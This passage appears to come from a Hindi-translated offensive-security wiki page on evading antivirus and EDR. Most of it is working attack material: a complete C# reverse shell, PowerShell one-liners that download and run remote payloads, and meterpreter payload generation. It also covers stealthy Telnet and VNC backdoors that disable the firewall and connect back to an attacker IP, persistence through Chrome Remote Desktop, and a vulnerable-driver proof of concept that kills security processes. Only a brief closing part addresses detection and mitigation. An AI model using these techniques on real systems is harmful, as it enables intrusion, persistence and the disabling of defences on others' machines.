рдпрд╣ рдЕрдкрдиреЗ рд╣реА рдкреНрд░реЛрд╕реЗрд╕ рдореЗрдВ post-exploitation malicious code **inject** рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИред рдЗрд╕ рддрд░рд╣ рдЖрдк рдирдпрд╛ рдкреНрд░реЛрд╕реЗрд╕ рдмрдирд╛рдиреЗ рдФрд░ рдЙрд╕реЗ AV рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд░рд╡рд╛рдиреЗ рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдиреБрдХрд╕рд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ payload рдХреЗ execution рдореЗрдВ рдХреБрдЫ рдЧрд▓рдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЗ **beacon** рдХреЗ рдЦреЛрдиреЗ рдХреА **рдХрд╛рдлреА рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд░рд╣рддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╡рд╣ рдХреНрд░реИрд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> рдпрджрд┐ рдЖрдк C# Assembly loading рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдХреГрдкрдпрд╛ рдЗрд╕ рдЖрд░реНрдЯрд┐рдХрд▓ рдХреЛ рджреЗрдЦреЗрдВ [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) рдФрд░ рдЙрдирдХрд╛ InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

рдЖрдк C# Assemblies рдХреЛ **from PowerShell** рднреА рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рджреЗрдЦреЗрдВ [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) рдФрд░ [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

рдЬреИрд╕рд╛ рдХрд┐ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╣реИ [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ compromised рдорд╢реАрди рдХреЛ рдЙрди рдЗрдВрдЯрд░рдкреНрд░реЗрдЯрд░ рдПрдирд╡рд╛рдпрд░рдирдореЗрдВрдЯ рддрдХ рдПрдХреНрд╕реЗрд╕ рджреЗрдХрд░ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ malicious code execute рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ Attacker Controlled SMB share рдкрд░ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛрдВред

SMB share рдкрд░ Interpreter Binaries рдФрд░ environment рддрдХ рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ рдЖрдк compromised рдорд╢реАрди рдХреА рдореЗрдореЛрд░реА рдореЗрдВ рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ **arbitrary code execute** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬреЛ attacker рдХреЛ access token рдпрд╛ рдХрд┐рд╕реА security prouct рдЬреИрд╕реЗ EDR рдпрд╛ AV рдХреЛ **manipulate** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡реЗ рдЙрд╕рдХреЗ privileges рдХрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдкреНрд░реЛрд╕реЗрд╕ рдорд░ рди рдЬрд╛рдП рдкрд░ рдЙрд╕рдХреЗ рдкрд╛рд╕ malicious рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП permissions рди рд░рд╣реЗрдВред

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

рдЬреИрд╕рд╛ рдХрд┐ [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдХрд┐рд╕реА victim рдХреЗ PC рдкрд░ Chrome Remote Desktop рдХреЛ deploy рдХрд░рдирд╛ рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ takeover рдХрд░ persistence рдмрдирд╛рдП рд░рдЦрдирд╛ рдЖрд╕рд╛рди рд╣реИ:
1. https://remotedesktop.google.com/ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ, "Set up via SSH" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рдлрд┐рд░ Windows рдХреЗ рд▓рд┐рдП MSI рдлрд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП MSI рдлрд╛рдЗрд▓ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
2. Victim рдкрд░ installer рдХреЛ silently рд░рди рдХрд░реЗрдВ (admin рдЖрд╡рд╢реНрдпрдХ): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop рдкреЗрдЬ рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдБ рдФрд░ next рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рд╡рд┐рдЬрд╝рд╛рд░реНрдб рдЖрдкрд╕реЗ authorize рдХрд░рдиреЗ рдХреЛ рдХрд╣реЗрдЧрд╛; рдЬрд╛рд░реА рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП Authorize рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рджрд┐рдП рдЧрдП рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдХреБрдЫ рд╕рдорд╛рдпреЛрдЬрди рдХреЗ рд╕рд╛рде execute рдХрд░реЗрдВ: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (рдзреНрдпрд╛рди рджреЗрдВ pin рдкреИрд░рд╛рдореАрдЯрд░ рдЬреЛ GUI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ pin рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред)


## Advanced Evasion

Evasion рдПрдХ рдмрд╣реБрдд рдЬрдЯрд┐рд▓ рд╡рд┐рд╖рдп рд╣реИ, рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдПрдХ рд╣реА рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрдИ рдЕрд▓рдЧ-рдЕрд▓рдЧ telemetry рд╕реНрд░реЛрддреЛрдВ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░рдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкрд░рд┐рдкрдХреНрд╡ environments рдореЗрдВ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрдирджреЗрдЦрд╛ рд░рд╣рдирд╛ рд▓рдЧрднрдЧ рдЕрд╕рдВрднрд╡ рд╣реИред

рд╣рд░ environment рдЬрд┐рд╕рдХрд╛ рдЖрдк рд╕рд╛рдордирд╛ рдХрд░рддреЗ рд╣реИрдВ, рдЙрд╕рдХреА рдЕрдкрдиреА рддрд╛рдХрдд рдФрд░ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ рд╣реЛрдВрдЧреАред

рдореИрдВ рдЖрдкрдХреЛ рдЕрддреНрдпрдзрд┐рдХ рдкреНрд░реЛрддреНрд╕рд╛рд╣рд┐рдд рдХрд░рддрд╛ рд╣реВрдБ рдХрд┐ рдЖрдк [@ATTL4S](https://twitter.com/DaniLJ94) рдХрд╛ рдпрд╣ рдЯреЙрдХ рджреЗрдЦреЗрдВ, рддрд╛рдХрд┐ Advanced Evasion рддрдХрдиреАрдХреЛрдВ рдореЗрдВ рдПрдХ foothold рдорд┐рд▓ рд╕рдХреЗред


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

рдпрд╣ @mariuszbit рдХрд╛ Evasion in Depth рдкрд░ рдПрдХ рдФрд░ рд╢рд╛рдирджрд╛рд░ рдЯреЙрдХ рд╣реИред


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **рдЬрд╛рдБрдЪреЗрдВ рдХрд┐ Defender рдХрд┐рд╕ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ malicious рдорд╛рдирддрд╛ рд╣реИ**

рдЖрдк [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдмрд╛рдЗрдирд░реА рдХреЗ рд╣рд┐рд╕реНрд╕реЛрдВ рдХреЛ рд╣рдЯрд╛рддрд╛ рдЬрд╛рдПрдЧрд╛ рдЬрдм рддрдХ рдХрд┐ рдпрд╣ рдкрддрд╛ рди рд▓рдЧрд╛ рд▓реЗ рдХрд┐ Defender рдХрд┐рд╕ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ malicious рдорд╛рди рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдЖрдкрдХреЛ рдЕрд▓рдЧ рдХрд░ рдХреЗ рджрд┐рдЦрд╛ рджреЗрдЧрд╛ред\
рдПрдХ рдФрд░ рдЯреВрд▓ рдЬреЛ рдпрд╣реА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рд╡рд╣ рд╣реИ [**avred**](https://github.com/dobin/avred) рдЬрд┐рд╕рдХрд╛ рдПрдХ рдУрдкрди рд╡реЗрдм рд╣реИ рдЬреЛ рд╕реЗрд╡рд╛ [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) рдкрд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ

### **Telnet Server**

Windows10 рд╕реЗ рдкрд╣рд▓реЗ, рд╕рднреА Windows рдХреЗ рд╕рд╛рде рдПрдХ Telnet server рдЖрддрд╛ рдерд╛ рдЬрд┐рд╕реЗ рдЖрдк (administrator рдХреЗ рд░реВрдк рдореЗрдВ) install рдХрд░ рд╕рдХрддреЗ рдереЗ, рдРрд╕рд╛ рдХрд░рддреЗ рд╣реБрдП:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
рдЗрд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдЪрд╛рд▓реВ рд╣реЛрдиреЗ рдкрд░ **рд╢реБрд░реВ** рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдЕрднреА **рдЪрд▓рд╛рдПрдБ**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port рдмрджрд▓реЗрдВ** (stealth) рдФрд░ firewall рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (рдЖрдкрдХреЛ bin downloads рдЪрд╛рд╣рд┐рдП, setup рдирд╣реАрдВ)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- рд╡рд┐рдХрд▓реНрдк _Disable TrayIcon_ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ
- _VNC Password_ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ
- _View-Only Password_ рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ

рдлрд┐рд░, рдмрд╛рдЗрдирд░реА _**winvnc.exe**_ рдФрд░ **рдирдпрд╛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛** рдлрд╝рд╛рдЗрд▓ _**UltraVNC.ini**_ рдХреЛ **victim** рдХреЗ рдЕрдВрджрд░ рд░рдЦреЗрдВ

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** рдЫреБрдкреЗ рд░рд╣рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреБрдЫ рдЪреАрдЬреЗрдВ рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП

- рдЕрдЧрд░ `winvnc` рдкрд╣рд▓реЗ рд╕реЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рд╢реБрд░реВ рди рдХрд░реЗрдВ, рд╡рд░рдирд╛ рдЖрдк [popup](https://i.imgur.com/1SROTTl.png) рдЯреНрд░рд┐рдЧрд░ рдХрд░ рджреЗрдВрдЧреЗред рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП `tasklist | findstr winvnc` рдЪрд▓рд╛рдПрдБ
- рдЙрд╕реА рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ `UltraVNC.ini` рдХреЗ рдмрд┐рдирд╛ `winvnc` рд╢реБрд░реВ рди рдХрд░реЗрдВ, рдирд╣реАрдВ рддреЛ рдпрд╣ [the config window](https://i.imgur.com/rfMQWcf.png) рдЦреЛрд▓ рджреЗрдЧрд╛
- рдорджрдж рдХреЗ рд▓рд┐рдП `winvnc -h` рди рдЪрд▓рд╛рдПрдБ рд╡рд░рдирд╛ рдЖрдк [popup](https://i.imgur.com/oc18wcu.png) рдЯреНрд░рд┐рдЧрд░ рдХрд░ рджреЗрдВрдЧреЗ

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT рдХреЗ рдЕрдВрджрд░:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
рдЕрдм `msfconsole -r file.rc` рдХреЗ рд╕рд╛рде **рд▓рд┐рд╕реНрдЯрд░ рд╢реБрд░реВ рдХрд░реЗрдВ** рдФрд░ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ** **xml payload** рдХреЗ рд╕рд╛рде:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**рд╡рд░реНрддрдорд╛рди Defender рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрд╣реБрдд рддреЗрдЬрд╝реА рд╕реЗ рд╕рдорд╛рдкреНрдд рдХрд░ рджреЗрдЧрд╛ред**

### рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ reverse shell рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### рдкрд╣рд▓рд╛ C# Revershell

рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
рдЗрд╕реЗ рдЗрд╕рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# рдХрдореНрдкрд╛рдЗрд▓рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators рд╕реВрдЪреА: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП python рдХрд╛ рдЙрдкрдпреЛрдЧ тАФ рдЙрджрд╛рд╣рд░рдг:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### рдЕрдиреНрдп рдЙрдкрдХрд░рдг
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### рдЕрдзрд┐рдХ

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) тАУ Kernel Space рд╕реЗ AV/EDR рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдирд╛

Storm-2603 рдиреЗ рдПрдХ рдЫреЛрдЯреЗ console utility рдЬрд┐рд╕реЗ **Antivirus Terminator** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ endpoint protections рдХреЛ рдбрд┐рд╕реЗрдмрд▓ рдХрд┐рдпрд╛ рдФрд░ рдлрд┐рд░ ransomware рдЧрд┐рд░рд╛рдИред рдпрд╣ рдЯреВрд▓ рдЕрдкрдирд╛ **vulnerable рдкрд░рдВрддреБ *signed* driver** рд▓реЗрдХрд░ рдЖрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдРрд╕реЗ privileged kernel рдСрдкрд░реЗрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП abuses рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ Protected-Process-Light (PPL) AV рд╕реЗрд╡рд╛рдПрдБ рднреА рдмреНрд▓реЙрдХ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреАрдВред

рдореБрдЦреНрдп рдирд┐рд╖реНрдХрд░реНрд╖
1. **Signed driver**: рдбрд┐рд╕реНрдХ рдкрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рдлрд╝рд╛рдЗрд▓ `ServiceMouse.sys` рд╣реИ, рд▓реЗрдХрд┐рди рдмрд╛рдЗрдирд░реА рдЕрд╕рд▓ рдореЗрдВ Antiy Labs рдХреЗ тАЬSystem In-Depth Analysis ToolkitтАЭ рдХрд╛ рд╡реИрдз рд░реВрдк рд╕реЗ signed driver `AToolsKrnl64.sys` рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдбреНрд░рд╛рдЗрд╡рд░ рдкрд░ рд╡реИрдз Microsoft рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╣реИ, рдпрд╣ рддрдм рднреА рд▓реЛрдб рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм Driver-Signature-Enforcement (DSE) enabled рд╣реЛред
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
рдкрд╣рд▓реА рд▓рд╛рдЗрди рдбреНрд░рд╛рдЗрд╡рд░ рдХреЛ **kernel service** рдХреЗ рд░реВрдк рдореЗрдВ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рддреА рд╣реИ рдФрд░ рджреВрд╕рд░реА рд▓рд╛рдЗрди рдЙрд╕реЗ рд╢реБрд░реВ рдХрд░рддреА рд╣реИ рддрд╛рдХрд┐ `\\.\ServiceMouse` user land рд╕реЗ рдПрдХреНрд╕реЗрд╕рд┐рдмрд▓ рд╣реЛ рдЬрд╛рдПред
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ PID рд╕реЗ terminate рдХрд░рдирд╛ (Defender/EDR рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдорд╛рд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ) |
| `0x990000D0` | рдбрд┐рд╕реНрдХ рдкрд░ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ delete рдХрд░рдирд╛ |
| `0x990001D0` | рдбреНрд░рд╛рдЗрд╡рд░ рдХреЛ unload рдФрд░ рд╕рд░реНрд╡рд┐рд╕ рдХреЛ remove рдХрд░рдирд╛ |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD user-mode protections рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реНрдХрд┐рдк рдХрд░ рджреЗрддрд╛ рд╣реИ; kernel рдореЗрдВ рдЪрд▓рдиреЗ рд╡рд╛рд▓рд╛ рдХреЛрдб protected processes рдХреЛ рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИ, рдЙрдиреНрд╣реЗрдВ terminate рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ kernel рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЪрд╛рд╣реЗ PPL/PP, ELAM рдпрд╛ рдЕрдиреНрдп hardening рдлреАрдЪрд░реНрд╕ рдореМрдЬреВрдж рд╣реЛрдВред

Detection / Mitigation
тАв Microsoft рдХреА vulnerable-driver block list (`HVCI`, `Smart App Control`) рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рддрд╛рдХрд┐ Windows `AToolsKrnl64.sys` рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рдордирд╛ рдХрд░ рджреЗред  
тАв рдирдП *kernel* services рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреА рдирд┐рдЧрд░рд╛рдиреА рдХрд░реЗрдВ рдФрд░ рдЕрд▓рд░реНрдЯ рдХрд░реЗрдВ рдЬрдм рдХреЛрдИ рдбреНрд░рд╛рдЗрд╡рд░ world-writable рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗ рд▓реЛрдб рд╣реЛ рдпрд╛ allow-list рдкрд░ рдореМрдЬреВрдж рди рд╣реЛред  
